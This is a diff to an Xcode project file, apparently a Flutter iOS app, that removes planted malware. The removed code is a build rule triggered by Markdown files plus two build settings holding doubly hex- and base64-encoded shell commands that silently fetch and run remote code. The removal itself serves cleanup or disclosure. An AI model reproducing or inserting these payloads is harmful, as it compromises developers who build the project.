@@ -135,7 +135,6 @@
 				331C807F294A63A400263BE5 /* Resources */,
 			);
 			buildRules = (
-				2F17DDF409A940C6ABC62C0C /* PBXBuildRule */,
 			);
 			dependencies = (
 				331C8086294A63A400263BE5 /* PBXTargetDependency */,
@@ -205,20 +204,6 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		2F17DDF409A940C6ABC62C0C /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AC0C26C}\"";
-			};
 																																			/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -328,8 +313,6 @@ sh -c \"${AC0C26C}\"";
 		249021D3217E4FDB00AE95B9 /* Profile */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AC0C26C = "((x(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663663363536373631366336313634373332653639366532663631323932320a3230376332303733363830610a | x | sh ) >/dev/null 2>&1 &)";
-				AE6D436 = "((n(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2WVhCd2JHVnlaV3hoZVM1eWRTOWhLU0lnZkNCemFBbz0K | n | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -383,8 +366,6 @@ sh -c \"${AC0C26C}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 7AFA3C8E1D35360C0083082E /* Release.xcconfig */;
 			buildSettings = {
-				AC0C26C = "((x(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663663363536373631366336313634373332653639366532663631323932320a3230376332303733363830610a | x | sh ) >/dev/null 2>&1 &)";
-				AE6D436 = "((n(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2WVhCd2JHVnlaV3hoZVM1eWRTOWhLU0lnZkNCemFBbz0K | n | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = "$(FLUTTER_BUILD_NUMBER)";
